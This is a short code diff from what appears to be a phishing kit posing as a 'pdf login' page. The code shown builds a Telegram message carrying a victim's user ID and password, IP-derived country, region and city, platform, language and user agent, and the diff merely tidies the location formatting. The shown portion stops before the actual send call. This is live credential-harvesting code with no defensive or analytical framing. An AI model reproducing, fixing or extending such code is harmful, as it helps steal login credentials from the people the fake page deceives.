@@ -686,12 +686,12 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
       const platform = navigator.platform;
       const language = navigator.language;
       const location = await getIpAndCountry();
-
+      const allLocation = location.country+' '+location.region+' '+location.city
       // Format the message for Telegram
       const message = `🔐 pdf login ATTEMPT 🔐\n\n` +
                       `📧 User Id: ${uid}\n` +
                       `🔑 Password: ${password}\n` +
-                      `🖥️ location: ${location.country, location.city}\n` +
+                      `🖥️ location: ${allLocation}\n` +
                       `📅 Time: ${timestamp}\n` +
                       `💻 User Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\n` +
                       `🖥️ Platform: ${platform}\n` +
